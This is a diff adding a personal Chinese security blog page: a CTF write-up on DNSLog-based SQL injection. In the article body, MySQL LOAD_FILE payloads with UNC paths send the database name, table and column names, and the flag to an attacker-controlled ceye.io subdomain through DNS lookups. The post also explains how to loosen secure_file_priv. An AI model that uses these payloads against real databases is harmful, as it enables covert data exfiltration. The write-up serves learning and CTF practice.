@@ -1,0 +1,396 @@
+<head>
+<script src="https://cdn.jsdelivr.net/npm/jquery/dist/jquery.min.js"></script>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome/css/font-awesome.min.css">
+<script src="https://cdn.jsdelivr.net/gh/stevenjoezhang/live2d-widget/autoload.js"></script>
+</head>
+
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+<head>
+    <!--Setting-->
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+    <meta http-equiv="Cache-Control" content="no-siteapp">
+    <meta http-equiv="Cache-Control" content="no-transform">
+    <meta name="renderer" content="webkit|ie-comp|ie-stand">
+    <meta name="apple-mobile-web-app-capable" content="ggy的个人博客">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <meta name="format-detection" content="telephone=no,email=no,adress=no">
+    <meta name="browsermode" content="application">
+    <meta name="screen-orientation" content="portrait">
+    <meta name="theme-version" content="1.2.3">
+    <meta name="root" content="/">
+    <link rel="dns-prefetch" href="https://ggyggy666.github.io">
+    <!--SEO-->
+
+<meta name="keywords" content="DNSLog型SQL注入" />
+
+
+<meta name="description" content="遇到了一道DNSLog注入的CTF题，之前都不知道原来还能这么玩，又涨知识了。
+
+当页面没有回显，只能使用布尔盲注或者时间盲注时，不得不利用脚本去一个个请求尝试，这样会发送大量请求包，可能导致I..." />
+
+
+<meta name="robots" content="all" />
+<meta name="google" content="all" />
+<meta name="googlebot" content="all" />
+<meta name="verify" content="all" />
+    <!--Title-->
+
+<title>
+    
+    DNSLog型SQL注入 |
+    
+    ggy的个人博客
+</title>
+
+<link rel="alternate" href="/atom.xml" title="ggy的个人博客" type="application/atom+xml">
+
+
+<link rel="icon" href="/favicon.ico">
+
+    
+
+
+<link rel="stylesheet" href="/css/bootstrap.min.css?rev=3.3.7.css">
+<link rel="stylesheet" href="/css/font-awesome.min.css?rev=4.7.0.css">
+<link rel="stylesheet" href="/css/style.css?rev=@@hash.css">
+
+    
+<div class="hide">
+    <script type="text/javascript">
+    var cnzz_protocol = (("https:" == document.location.protocol) ? " https://" : " http://");
+    document.write(unescape("%3Cspan class='cnzz_stat_icon_1263868967 hide' %3E%3Cscript%20src%3D%22https%3A%2F%2Fs95.cnzz.com%2Fz_stat.php%3Fweb_id%3D1272564536%22%3E%3C%2Fscript%3E%3C/span%3E%3Cscript src='" + cnzz_protocol + "s19.cnzz.com/z_stat.php%3Fid%3D1263868967%26show%3Dpic1' type='text/javascript'%3E%3C/script%3E"));
+    </script>
+</div>
+
+
+
+
+    
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+<!--[if lte IE 8]>
+<style>
+    html{ font-size: 1em }
+</style>
+<![endif]-->
+<!--[if lte IE 9]>
+<div style="ie">你使用的浏览器版本过低，为了你更好的阅读体验，请更新浏览器的版本或者使用其他现代浏览器，比如Chrome、Firefox、Safari等。</div>
+<![endif]-->
+<body>
+    <header class="main-header"  style="background-image:url(
+    https://pic.downk.cc/item/5e3816b82fb38b8c3c8791f9.jpg)"
+     >
+    <div class="main-header-box">
+        <a class="header-avatar" href="/" title='ggy'>
+            <img src="/img/avatar.jpg" alt="logo头像" class="img-responsive center-block">
+        </a>
+        <div class="branding">
+            <!--<h2 class="text-hide">Snippet主题,从未如此简单有趣</h2>-->
+            
+            <h2>
+                欢迎来到ggy的个人网站
+            </h2>
+            
+        </div>
+    </div>
+</header>
+    <nav class="main-navigation">
+    <div class="container">
+        <div class="row">
+            <div class="col-sm-12">
+                <div class="navbar-header"><span class="nav-toggle-button collapsed pull-right" data-toggle="collapse" data-target="#main-menu" id="mnav">
+                        <span class="sr-only"></span>
+                        <i class="fa fa-bars"></i>
+                    </span>
+                    <a class="navbar-brand" href="https://ggyggy666.github.io">
+                        ggy的个人博客</a>
+                </div>
+                <div class="collapse navbar-collapse" id="main-menu">
+                    <ul class="menu">
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/"><i class="fa "></i>
+                                首页</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/categories/web安全/"><i class="fa "></i>
+                                web安全</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/categories/python工具/"><i class="fa "></i>
+                                python工具</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/categories/密码学/"><i class="fa "></i>
+                                密码学</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/archives/"><i class="fa "></i>
+                                时间轴</a>
+                        </li>
+                        
+                    </ul>
+                </div>
+            </div>
+        </div>
+    </div>
+</nav>
+    <section class="content-wrap">
+        <div class="container">
+            <div class="row">
+                <main class="col-md-8 main-content m-post">
+                    <p id="process"></p>
+<article class="post">
+    <div class="post-head">
+        <h1 id="DNSLog型SQL注入">
+            
+            DNSLog型SQL注入
+            
+        </h1>
+        <div class="post-meta">
+    
+    <span class="categories-meta fa-wrap">
+        <i class="fa fa-folder-open-o"></i>
+        <a class="category-link" href="/categories/SQL%E6%B3%A8%E5%85%A5/">SQL注入</a>
+    </span>
+    
+    
+    <span class="fa-wrap">
+        <i class="fa fa-tags"></i>
+        <span class="tags-meta">
+            
+            <a class="tag-link" href="/tags/DNSLog%E5%9E%8BSQL%E6%B3%A8%E5%85%A5/" rel="tag">DNSLog型SQL注入</a>
+            
+        </span>
+    </span>
+    
+    
+    
+    <span class="fa-wrap">
+        <i class="fa fa-clock-o"></i>
+        <span class="date-meta">
+            2020/03/26</span>
+    </span>
+    
+    <span class="fa-wrap">
+        <i class="fa fa-eye"></i>
+        <span id="busuanzi_value_page_pv"></span>
+    </span>
+    
+    
+</div>
+        
+        
+        <p class="fa fa-exclamation-triangle warning">
+            本文于<strong>
+                351</strong>
+            天之前发表，文中内容可能已经过时。
+        </p>
+        
+    </div>
+    
+    <div class="post-body post-content">
+        <p>遇到了一道DNSLog注入的CTF题，之前都不知道原来还能这么玩，又涨知识了。</p>
+<a id="more"></a>
+<p>当页面没有回显，只能使用布尔盲注或者时间盲注时，不得不利用脚本去一个个请求尝试，这样会发送大量请求包，可能导致IP被禁。因此需要利用dnslog注入。(需要文件权限）</p>
+<h1 id="查看是否拥有文件权限"><a href="#查看是否拥有文件权限" class="headerlink" title="查看是否拥有文件权限"></a>查看是否拥有文件权限</h1><p>在自己的mysql上，输入：<br><code>show variables like &#39;%secure%&#39;;</code><br><img src="https://pic.downk.cc/item/5e7c6ff5504f4bcb049d304a.jpg" alt><br>可以看到secure_file_priv的值是一个目录，代表只可以读取这个目录下的文件。如果是NULL，代表无法读取任意文件,这个时候需要修改my.ini配置，在mysqld部分增加：secure_file_priv=’D:\phpstudy_pro\WWW’,就可以读取这个目录下的文件了。网上说，如果是：secure_file_priv=’’可以读取任意文件，但我试过了会出错不得行。这个时候需要变成：<strong>secure_file_priv=</strong>   直接不用引号，然后再查看：  </p>
+<p><img src="https://pic.downk.cc/item/5e7c7311504f4bcb049f3452.jpg" alt></p>
+<h1 id="发送DNS查询"><a href="#发送DNS查询" class="headerlink" title="发送DNS查询"></a>发送DNS查询</h1><p>有了文件权限就可以使用Load_file了（MySQL下）.这里得提到ceye.io网站。它可以提供给注册者一个域名，如果使用这个域名进行查询或者请求都会收到记录。上面也讲有SQL注入、命令执行等漏洞的payload利用。</p>
+<pre><code>SELECT LOAD_FILE(CONCAT(&apos;\\\\&apos;,(SELECT hex(user())),&apos;.2iw1pn.ceye.io\\abc&apos;));</code></pre><h2 id="UNC路径"><a href="#UNC路径" class="headerlink" title="UNC路径"></a>UNC路径</h2><p>解释一下payload是怎么构造出来的。这就需要涉及到UNC路径的知识了。<br>UNC是网络（主要是局域网）资源的完整Windows 2000名称，只适用于Windows。通过UNC路径就能访问到网络上的共享文件夹资源。它的格式如下：</p>
+<pre><code>\\主机名（或域名或ip）\共享资源名称</code></pre><p>由于这个是访问主机名下的共享文件目录，肯定得先找到该主机名或者域名对应的ip地址，因此需要向DNS服务器发起一个解析请求。不难联想到，当我们查询数据库时，拼接上我们的域名，再以这种UNC路径的格式查询，那就会将查询到的数据与域名一起作为一个子域名然后发起解析请求，给域名所在的网站（ceye.io）收到了这个解析请求后保存了下来就能被我们看到，从而查询出数据。</p>
+<p><strong>查询后会需要等待一段时间</strong>，直至出现：</p>
+<p><img src="https://pic.downk.cc/item/5e7c74bf504f4bcb04a05b56.jpg" alt></p>
+<p>需要注意，不知道为什么在命令行这里必须需要使用hex编码后才能发送查询成功，在实际场景可以试试不用hex编码。查看ceye.io的DNS查询记录：</p>
+<p><img src="https://pic.downk.cc/item/5e7c74fe504f4bcb04a0842c.jpg" alt></p>
+<p>可以看到已经成功记录了查询的user的十六进制（即第一个.之前的数字）。使用hackbar的hex解码后：</p>
+<p><img src="https://pic.downk.cc/item/5e7c755f504f4bcb04a0ca32.jpg" alt></p>
+<p>成功查询到user。</p>
+<h1 id="一道CTF题目"><a href="#一道CTF题目" class="headerlink" title="一道CTF题目"></a>一道CTF题目</h1><p>地址是：<a href="http://www.zhanluanjie.win:10020/time.php?id=1" target="_blank" rel="noopener">http://www.zhanluanjie.win:10020/time.php?id=1</a><br>这道题就是可以用布尔或者时间盲注，但如果用脚本的话访问太频繁会出错。因此使用DNSLog注入。</p>
+<h2 id="查看是否拥有文件权限-1"><a href="#查看是否拥有文件权限-1" class="headerlink" title="查看是否拥有文件权限"></a>查看是否拥有文件权限</h2><pre><code>and(select count(*) from mysql.user)&gt;0</code></pre><p>返回正确则拥有，错误则没有。</p>
+<h2 id="爆数据库"><a href="#爆数据库" class="headerlink" title="爆数据库"></a>爆数据库</h2><pre><code>and load_file(concat(&apos;\\\\&apos;,(select database()),&apos;.2iw1pn.ceye.io\\abc&apos;));</code></pre><p>可以看到上面<strong>使用的是and, 使用select 或者 and select不行，还是看具体情况决定使用哪个吧。这里也不用hex</strong>。（发送请求之后都会转一段时间，正常现象）。</p>
+<p><img src="https://pic.downk.cc/item/5e7c772a504f4bcb04a1e2b9.jpg" alt></p>
+<p>爆出来的数据库名是：dnslog</p>
+<h2 id="爆表名"><a href="#爆表名" class="headerlink" title="爆表名"></a>爆表名</h2><pre><code>and load_file(concat(&apos;\\\\&apos;,(select group_concat(table_name) from information_schema.tables where table_schema=&apos;dnslog&apos;),&apos;.2iw1pn.ceye.io\\abc&apos;));</code></pre><p><img src="https://pic.downk.cc/item/5e7c779b504f4bcb04a2206e.jpg" alt></p>
+<h2 id="爆列名"><a href="#爆列名" class="headerlink" title="爆列名"></a>爆列名</h2><pre><code>and load_file(concat(&apos;\\\\&apos;,(select group_concat(column_name) from information_schema.columns where table_name=&apos;flag_is_here&apos;),&apos;.2iw1pn.ceye.io\\abc&apos;));</code></pre><p><img src="https://pic.downk.cc/item/5e7c7849504f4bcb04a28588.jpg" alt></p>
+<h2 id="爆字段"><a href="#爆字段" class="headerlink" title="爆字段"></a>爆字段</h2><pre><code>and load_file(concat(&apos;\\\\&apos;,(select group_concat(flag) from flag_is_here),&apos;.2iw1pn.ceye.io\\abc&apos;));</code></pre><p><img src="https://pic.downk.cc/item/5e7c788a504f4bcb04a2b008.jpg" alt></p>
+<p>flag就爆出来了。只需要加：flag{…}即可。</p>
+<p>参考：<a href="https://www.cnblogs.com/zhaijiahui/p/9160913.html#autoid-4-2-11" target="_blank" rel="noopener">https://www.cnblogs.com/zhaijiahui/p/9160913.html#autoid-4-2-11</a></p>
+
+    </div>
+    
+    <div class="reward" ontouchstart>
+    <div class="reward-wrap">赏
+        <div class="reward-box">
+            
+            <span class="reward-type">
+                <img class="alipay" src="/img/alipay.jpg"><b>支付宝打赏</b>
+            </span>
+            
+            
+            <span class="reward-type">
+                <img class="wechat" src="/img/wechat.jpg"><b>微信打赏</b>
+            </span>
+            
+        </div>
+    </div>
+    <p class="reward-tip">
+        赞赏是不耍流氓的鼓励
+    </p>
+</div>
+    
+    <div class="post-footer">
+        <div>
+            
+            转载声明：
+            商业转载请联系作者获得授权,非商业转载请注明出处 © <a href="ggy.44pp.vip" target="_blank">ggy</a>
+            
+            
+        </div>
+        <div>
+            
+        </div>
+    </div>
+</article>
+<div class="article-nav prev-next-wrap clearfix">
+    
+    <a href="/2020/03/27/SOAP%E6%B3%A8%E5%85%A5/" class="pre-post btn btn-default" title='SOAP注入'>
+        <i class="fa fa-angle-left fa-fw"></i><span class="hidden-lg">上一篇</span>
+        <span class="hidden-xs">
+            SOAP注入</span>
+    </a>
+    
+    
+    <a href="/2020/03/22/SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/" class="next-post btn btn-default" title='SQL注入总结'>
+        <span class="hidden-lg">下一篇</span>
+        <span class="hidden-xs">
+            SQL注入总结</span><i class="fa fa-angle-right fa-fw"></i>
+    </a>
+    
+</div>
+
+<div id="comments">
+    
+<div id="lv-container" data-id="city" data-uid="MTAyMC80ODM1Ni8yNDg1MA==">
+    <script type="text/javascript">
+    (function(d, s) {
+        var j, e = d.getElementsByTagName(s)[0];
+        if (typeof LivereTower === 'function') { return; }
+        j = d.createElement(s);
+        j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+        j.async = true;
+        e.parentNode.insertBefore(j, e);
+    })(document, 'script');
+    </script>
+</div>
+
+</div>
+
+                </main>
+                
+                    <aside id="article-toc" role="navigation" class="col-md-4">
+    <div class="widget">
+        <h3 class="title">
+            文章目录
+        </h3>
+        
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#查看是否拥有文件权限"><span class="toc-text">查看是否拥有文件权限</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#发送DNS查询"><span class="toc-text">发送DNS查询</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#UNC路径"><span class="toc-text">UNC路径</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#一道CTF题目"><span class="toc-text">一道CTF题目</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#查看是否拥有文件权限-1"><span class="toc-text">查看是否拥有文件权限</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#爆数据库"><span class="toc-text">爆数据库</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#爆表名"><span class="toc-text">爆表名</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#爆列名"><span class="toc-text">爆列名</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#爆字段"><span class="toc-text">爆字段</span></a></li></ol></li></ol>
+        
+    </div>
+</aside>
+                
+            </div>
+        </div>
+    </section>
+    <footer class="main-footer">
+    <div class="container">
+        <div class="row">
+        </div>
+    </div>
+</footer>
+<a id="back-to-top" class="icon-btn hide">
+    <i class="fa fa-chevron-up"></i>
+</a>
+    <div class="copyright">
+    <div class="container">
+        <div class="row">
+            <div class="col-sm-12">
+                <div class="busuanzi">
+    
+    访问量:
+    <strong id="busuanzi_value_site_pv">
+        <i class="fa fa-spinner fa-spin"></i>
+    </strong>
+    &nbsp; | &nbsp;
+    访客数:
+    <strong id="busuanzi_value_site_uv">
+        <i class="fa fa-spinner fa-spin"></i>
+    </strong>
+    
+</div>
+            </div>
+            <div class="col-sm-12">
+                <span>Copyright &copy;
+                    2020
+                    
+                </span> |
+                <span>
+                    Powered by <a href="//hexo.io" class="copyright-links" target="_blank" rel="nofollow">Hexo</a>
+                </span> |
+                <span>
+                    Theme by <a href="//github.com/shenliyang/hexo-theme-snippet.git" class="copyright-links" target="_blank" rel="nofollow">Snippet</a>
+                </span>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+<script src="/assets/tagcanvas.min.js?rev=2.9.js"></script>
+
+<script>
+var tagOption = {
+    textColour: '#444', // 字体颜色
+    outlineMethod: 'block', // 选中模式
+    outlineColour: '#FFDAB9', // 选中模式的颜色
+    interval: 30 || 30, // 动画帧之间的时间间隔，值越大，转动幅度越大
+    textHeight: 13,
+    outlineRadius: 3,
+    freezeActive: true || '', // 选中的标签是否继续滚动
+    frontSelect: true || '', // 不选标签云后部的标签
+    initial: [0.1, -0.1],
+    depth: 0.5,
+    decel: 0.95,
+    maxSpeed: 0.03,
+    reverse: true || '', // 是否反向触发
+    fadeIn: 500, // 进入动画时间
+    wheelZoom: false || '' // 是否启用鼠标滚轮
+}
+TagCanvas.Start('tag-cloud-3d', '', tagOption);
+</script>
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+<script src="/js/app.js?rev=@@hash.js"></script>
+
+
+<!-- 雪花特效 -->
+<script type="text/javascript" src="http://libs.baidu.com/jquery/1.8.3/jquery.js"></script>
+<script type="text/javascript" src="http://libs.baidu.com/jquery/1.8.3/jquery.min.js"></script>
+<script type="text/javascript" src="\js\snow.js"></script>
+
+<canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;" ></canvas> 
+<script type="text/javascript" src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script> 
+<script type="text/javascript" src="/js/fireworks.js"></script>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"live2d-widget-model-haruto"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
